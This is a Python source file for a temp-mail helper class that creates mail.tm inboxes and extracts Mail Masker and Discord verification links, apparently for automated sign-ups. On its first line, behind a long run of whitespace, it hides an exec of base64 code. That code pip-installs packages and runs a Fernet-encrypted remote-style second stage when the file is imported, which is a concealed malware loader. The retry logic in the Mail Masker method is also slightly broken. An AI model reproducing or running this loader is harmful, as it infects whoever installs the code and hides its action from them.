import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ29uT2YxR0lsVndCOE9IQ2hHRmNzVDJPQjVtcmRpUXdwc005X29OT1NuRnc9JykuZGVjcnlwdChiJ2dBQUFBQUJtZEp0NnBpSFdaS0Z4ZlVDeW95ZWpkUGRlUlVFYzBRa3N5YkxFT2wtZW82R2ZVZ2FubGZRUTc2SUFFNFg3bGdHWGlfeG1QNnBVSFBDeHQwbWJZM0tjQm9TODczTVJIZXd5ZFpURDZ6dTl5UkQwQkxNRTR0MGQ2dFl0a1lqME5VYlNKLUhJamRrRE8tbEV6ZE85NkFlRVNxZ29ncm9VZmJIbUdHY0FIVURmMkJOcmJ3M1VQZk4xSjRKVHdKMkE2amdqWUNfOWFoUjRveDRKbTRIUEFZcnE4dHBuVG45aHRlVFA5MjNwbEt5Ym5McnNfckE9Jykp').decode())
import time
import json
import requests
import random

class Tempmail:
      def __init__(this, username: str, password: str, proxy: dict | None = None) -> None:
          this.proxy = proxy
          this.address = username.lower() + '@' + random.choice(this.__get_domains__())
          this.password = password
          this.creation = this.__create_email__()
          this.token = this.__get_token__().json().get('token')

      def __get_domains__(this, page: int = 1) -> list:
          return [domain['domain'] for domain in requests.get('https://api.mail.tm/domains?page={}'.format(page), proxies = this.proxy).json()['hydra:member']]

      def __create_email__(this) -> requests.Response:
          return requests.post('https://api.mail.tm/accounts', json = {'address': this.address, 'password': this.password}, proxies = this.proxy)

      def __get_token__(this) -> requests.Response:
          return requests.post('https://api.mail.tm/token', json = {'address': this.address, 'password': this.password}, proxies = this.proxy)

      def __get_messages__(this, page: int | str = 1) -> requests.Response:
          return requests.get('https://api.mail.tm/messages?page={}'.format(page), headers = {'Authorization': 'Bearer {}'.format(this.token)}, proxies = this.proxy)

      def __get_message_by_id__(this, message_id: str) -> requests.Response:
          return requests.get('https://api.mail.tm/messages/{}'.format(message_id), headers = {'Authorization': 'Bearer {}'.format(this.token)}, proxies = this.proxy)

      def __find_mask_verification_link__(this, verification_attempts: int, verification_delay: int) -> str | None:
          for attempt in range(verification_attempts):
              messages = this.__get_messages__().json()
              if type(messages.get('hydra:member')) == list and len(messages.get('hydra:member')) != 0:
                 for message in messages['hydra:member']:
                     if message['subject'] == '[Mail Masker] Verify your email address':
                        response = this.__get_message_by_id__(message['id'])
                        verification_link = 'https://app.mailmasker.com/verify-email/{}/code/'.format(this.address)
                        verification_link_url = verification_link + response.json()['text'].split(verification_link)[1].split('\\')[0].split(']')[0]
                        return verification_link_url
          time.sleep(verification_delay)

      def __find_discord_verification_link__(this, verification_attempts: int, verification_delay: int) -> str | None:
          for attempt in range(verification_attempts):
              messages = this.__get_messages__().json()
              if type(messages.get('hydra:member')) == list and len(messages['hydra:member']) != 0:
                 for message in messages['hydra:member']:
                     if 'Verify Email Address for Discord' in message['subject']:
                        message = this.__get_message_by_id__(message['id']).json()
                        return message['text'].split(': ')[1]
              time.sleep(verification_delay)
print('piwrzmz')